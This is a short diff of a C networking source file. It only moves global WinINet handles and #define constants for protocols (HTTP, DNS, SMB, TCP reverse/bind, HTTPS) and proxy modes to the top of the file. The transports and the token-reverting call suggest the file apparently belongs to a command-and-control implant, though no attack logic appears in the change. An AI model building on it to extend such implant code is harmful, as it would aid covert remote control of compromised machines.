@@ -8,6 +8,22 @@
 #include "transform.h"
 
 BOOL gNetworkIsInit = FALSE;
+HINTERNET gInternetConnect;
+DWORD gNetworkOptions;
+DWORD gContext;
+HINTERNET gInternetOpen;
+
+#define PROTOCOL_HTTP 0
+#define PROTOCOL_DNS 1
+#define PROTOCOL_SMB 2
+#define PROTOCOL_TCP_REVERSE 4
+#define PROTOCOL_HTTPS 8
+#define PROTOCOL_TCP_BIND 16
+
+#define PROXY_MANUAL 0
+#define PROXY_DIRECT 1
+#define PROXY_PRECONFIG 2
+#define PROXY_MANUAL_CREDS 4
 
 void NetworkInit(void)
 {
@@ -55,13 +71,6 @@ ULONG NetworkGetActiveAdapterIPv4()
 	return 0;
 }
 
-#define PROTOCOL_HTTP 0
-#define PROTOCOL_DNS 1
-#define PROTOCOL_SMB 2
-#define PROTOCOL_TCP_REVERSE 4
-#define PROTOCOL_HTTPS 8
-#define PROTOCOL_TCP_BIND 16
-
 void NetworkStatusCallback(HINTERNET hInternet, DWORD_PTR dwContext, DWORD dwInternetStatus, LPVOID lpvStatusInformation, DWORD dwStatusInformationLength)
 {
 	if (dwInternetStatus == INTERNET_STATUS_CONNECTED_TO_SERVER)
@@ -98,10 +107,6 @@ BOOL NetworkCheckResponse(HINTERNET hInternet)
 
 	return atoi(status) == HTTP_STATUS_OK;
 }
-
-HINTERNET gInternetConnect;
-DWORD gNetworkOptions;
-DWORD gContext;
 
 int NetworkGetInternal(const char* uri, SESSION* session, char* data, const int maxGet)
 {
@@ -192,12 +197,6 @@ int NetworkGet(const char* getUri, SESSION* session, char* data, const int maxGe
 	return result;
 }
 
-#define PROXY_MANUAL 0
-#define PROXY_DIRECT 1
-#define PROXY_PRECONFIG 2
-#define PROXY_MANUAL_CREDS 4
-
-HINTERNET gInternetOpen;
 void NetworkConfigureHttp(LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszAgent)
 {
 	IdentityRevertToken();
